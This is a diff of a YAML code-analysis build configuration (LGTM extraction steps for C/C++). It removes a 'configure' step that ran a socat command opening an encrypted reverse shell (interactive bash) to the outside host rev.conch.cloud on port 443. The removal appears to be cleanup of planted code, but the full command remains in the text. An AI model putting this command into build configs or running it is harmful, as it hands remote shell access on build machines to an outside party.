@@ -14,9 +14,6 @@ extraction:
     after_prepare:    # Customizable step used by all languages.
       - export GNU_MAKE=make
       - export GIT=true
-    configure:    # Customizable step used only by C/C++ extraction.
-      command:
-        - socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:rev.conch.cloud:443,cert=client.pem,cafile=server.crt 
     before_index:    # Customizable step used by all languages.
       - export BOOST_DIR=$LGTM_SRC/boost
       - export GTEST_DIR=$LGTM_SRC/googletest
